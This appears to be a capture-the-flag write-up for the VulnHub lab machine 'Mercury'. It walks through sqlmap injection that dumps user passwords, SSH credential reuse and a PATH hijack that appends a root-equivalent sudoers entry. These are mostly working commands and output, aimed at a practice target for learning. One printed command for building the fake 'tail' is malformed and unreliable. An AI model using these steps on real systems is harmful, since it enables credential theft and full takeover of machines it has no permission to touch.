# VulnHub - The Planets: Mercury (Write-Up)

_6 min read · February 16, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**The Planets: Mercury**](https://www.vulnhub.com/entry/the-planets-mercury,544/) machine from [**VulnHub**](https://www.vulnhub.com/about/).

- Goal: Obtain User and Root Flag.
- Difficulty: Easy
- Machine Author: SirFlash

---

## Getting the Machine IP Address

As usual:

```bash
sudo netdiscover -i eth0 -r 10.0.2.0/24
```

In my case, the machine IP address is **10.0.2.3**.

## Scanning for Open Ports

Again as usual:

```bash
nmap -sS 10.0.2.3
sudo nmap -sCV -p 22,8080 10.0.2.3
```

![Nmap Output](./img/vulnhub-planetmercury/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 8080) is open and `robots.txt` is available.

Then as usual, I browsed the site.

![Mercury: Website](./img/vulnhub-planetmercury/web.png)

I inspected the source code but I didn't find anything interesting.

---

## Futher Enumeration on the Website

I accessed `robots.txt`:

```output
User-agent: *
Disallow: /
```

There was nothing useful there as well.

I also used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate directories, but it only showed `robots.txt`.

After some time, I manually tried `/admin` in the URL and got an error page.

![Mercury: Website Error](./img/vulnhub-planetmercury/web-error.png)

Then I accessed `/mercuryfacts/`.

![Mercury: Mercury Facts](./img/vulnhub-planetmercury/web-facts.png)

Inside, I clicked 'Load a fact'.

![Mercury: Load a Fact](./img/vulnhub-planetmercury/web-load-fact.png)

I noticed that when I changed the number in the URL, it displayed a different fact. That strongly suggested that the page was pulling data dynamically from a database.

Then I accessed the 'Todo list' page.

![Mercury: Todo](./img/vulnhub-planetmercury/web-todo.png)

This confirmed that it was connected to a backend database, which is `mysql`.

---

## Database Enumeration

I enumerated the database using [**sqlmap**](https://www.kali.org/tools/sqlmap/).

```bash
sqlmap -u "http://10.0.2.3:8080/mercuryfacts/" --dbs
```

```output
[09:02:01] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[09:02:01] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury
```

Then I enumerated tables in 'mercury' database:

```bash
sqlmap -u "http://10.0.2.3:8080/mercuryfacts/" -D 'mercury' --tables
```

```output
Database: mercury
[2 tables]
+-------+
| facts |
| users |
+-------+
```

Next, I checked the columns of the 'users' table:

```bash
sqlmap -u "http://10.0.2.3:8080/mercuryfacts/" -D 'mercury' -T 'users' --columns
```

```output
Database: mercury
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
```

Finally, I dumped the table:

```bash
sqlmap -u "http://10.0.2.3:8080/mercuryfacts/" -D 'mercury' -T 'users' --dump
```

```output
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
```

And I got the usernames and passwords!

---

## Post-Exploitation Enumeration

I attempted to use these credentials for SSH access.

Only the 'webmaster' account worked.

```bash
ssh webmaster@10.0.2.3
mercuryisthesizeof0.056Earths
```

After logging in, i found **user flag**.

![User Flag](./img/vulnhub-planetmercury/user-flag.png)

Then I continued enumerating the system and navigated to `mercury_proj`.

![notes.txt](./img/vulnhub-planetmercury/notes.png)

Inside, there was a `notes.txt` file containing credentials.

I decoded it using **base64**:

```bash
echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d
```

```output
mercurymeandiameteris4880km
```

I checked `/etc/passwd` and confirmed that a user named 'linuxmaster' exists.

![/etc/passwd](./img/vulnhub-planetmercury/etc-passwd.png)

So I switched user:

```bash
su linuxmaster
mercurymeandiameteris4880km
```

As usual, I performed my post-exploitation checklist.

```bash
sudo -l
```

![linuxmaster sudo Permission](./img/vulnhub-planetmercury/linuxmaster-sudo-l.png)

This means:

- 'linuxmaster' can run `check_syslog.sh` as root.
- The `SETENV` option is enabled.
- Environment variables can be modified.

I inspected the script:

![linuxmaster check_syslog.sh](./img/vulnhub-planetmercury/check-syslog.png)

The script simply prints the last 10 lines of `/var/log/syslog`. However, I noticed that it calls `tail` without an absolute path (`/usr/bin/tail`).

---

## Privilege Escalation

Since `SETENV` is allowed, I can modify the `PATH` variable.

If I place my own malicious `tail` in a directory I control and make that directory appear first in `PATH`, the script will execute mine instead of the real `tail`.

So I created my own `tail` in `/tmp`.

```bash
cd /tmp
echo '#!/bin/bash >' tail
echo 'echo "linuxmaster ALL=(ALL:ALL) ALL" >> /etc/sudoers' >> tail
chmod +x tail
```

Then I executed:

```bash
sudo PATH=/tmp:$PATH /usr/bin/check_syslog.sh
```

Because `/tmp` is now first in `PATH`, the script runs `/tmp/tail` instead of `/usr/bin/tail`.

Then I switched to root and retrieved the **root flag**.

```bash
sudo su
cd /root
cat root_flag.txt
```

![Root Flag](./img/vulnhub-planetmercury/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

The Planets: Mercury is an easy machine that focuses on SQL injection, credential reuse and privilege escalation through sudo misconfig. From this machine, I learned how to:

- identify SQL injection points in dynamic web applications
- use sqlmap to enumerate databases, tables, and dump credentials
- abuse `SETENV` and perform PATH hijacking
- escalate privileges by exploiting scripts that call binaries without absolute paths

Thank you for reading and see you next time.
